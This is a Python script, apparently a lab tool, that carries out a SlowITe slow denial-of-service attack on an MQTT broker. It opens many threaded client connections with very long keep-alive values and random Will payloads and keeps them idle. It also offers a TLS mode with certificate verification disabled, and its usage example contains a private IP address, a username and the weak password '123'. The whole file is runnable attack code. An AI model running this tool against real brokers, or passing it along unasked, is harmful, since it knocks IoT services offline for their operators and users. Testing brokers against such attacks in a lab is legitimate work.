import paho.mqtt.client as mqtt
import ssl
import time
import random
import argparse
import threading

"""
slowite_attack.py
=================
Simulate a SlowITe (Slow DoS) attack by opening many MQTT CONNECT sessions
with abnormally large or inconsistent keep-alive intervals. Each client
connects slowly, possibly with a Will payload, then idles for a long period.
Supports both insecure and CA-verified TLS modes.

Usage:
   python .slwit.py --host 10.12.112.191 --port 8883 --clients 10 --delay 2 --username giamdoc --password 123   --kalive-min 60000 --kalive-max 65535 --will-size 200 --idle 30    --tls --ca-file .\certs\ca-cert.pem    
"""

def create_client(client_id, args):
    client = mqtt.Client(client_id=client_id, clean_session=True)

    # TLS Configuration
    if args.tls:
        if args.ca_file:
            print(f"[TLS] Using CA certificate: {args.ca_file}")
            client.tls_set(
                ca_certs=args.ca_file,
                cert_reqs=ssl.CERT_REQUIRED,
                tls_version=ssl.PROTOCOL_TLS_CLIENT
            )
        else:
            print("[TLS] No CA file provided — skipping certificate verification (insecure mode)")
            client.tls_set(cert_reqs=ssl.CERT_NONE)
            client.tls_insecure_set(True)

    # Optional authentication
    if args.username:
        client.username_pw_set(args.username, args.password)

    return client

def slowite_worker(index, args):
    client_id = f"slowite-client-{index}"
    client = create_client(client_id, args)

    kalive = random.randint(args.kalive_min, args.kalive_max)
    will_payload = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=args.will_size))

    client.will_set(topic=f"slowite/{client_id}/status", payload=will_payload, qos=0, retain=False)

    try:
        # Introduce slow connection behavior
        time.sleep(random.uniform(0, args.delay))
        print(f"[+] Connecting {client_id} with keepalive={kalive}")
        client.connect(args.host, args.port, keepalive=kalive)
        client.loop_start()

        # Simulate minimal legitimate behavior
        #client.publish(f"slowite/{client_id}/telemetry", payload="hello", qos=0, retain=False)

        # Idle to keep connections open
        time.sleep(args.idle)

        # Clean disconnect
        client.loop_stop()
        client.disconnect()
        print(f"[-] Disconnected {client_id}")
    except Exception as e:
        print(f"[!] {client_id} error: {e}")

def main():
    parser = argparse.ArgumentParser(description="SlowITe Attack Simulator")
    parser.add_argument('--host', required=True, help='MQTT broker hostname or IP')
    parser.add_argument('--port', type=int, default=8883, help='MQTT port (default 8883 for TLS)')
    parser.add_argument('--clients', type=int, default=5, help='Number of concurrent attack clients')
    parser.add_argument('--delay', type=float, default=2.0, help='Max random delay between client connects (s)')
    parser.add_argument('--kalive-min', type=int, default=30000, help='Minimum MQTT keepalive value')
    parser.add_argument('--kalive-max', type=int, default=65535, help='Maximum MQTT keepalive value')
    parser.add_argument('--will-size', type=int, default=100, help='Size of the MQTT Will payload (bytes)')
    parser.add_argument('--idle', type=int, default=60, help='Seconds to hold connection open before disconnecting')
    parser.add_argument('--tls', action='store_true', help='Enable TLS (default port 8883)')
    parser.add_argument('--ca-file', default=None, help='Path to CA certificate file for TLS verification')
    parser.add_argument('--username', default=None, help='MQTT username')
    parser.add_argument('--password', default=None, help='MQTT password')

    args = parser.parse_args()

    threads = []
    for i in range(args.clients):
        t = threading.Thread(target=slowite_worker, args=(i, args), daemon=True)
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

if __name__ == '__main__':
    main()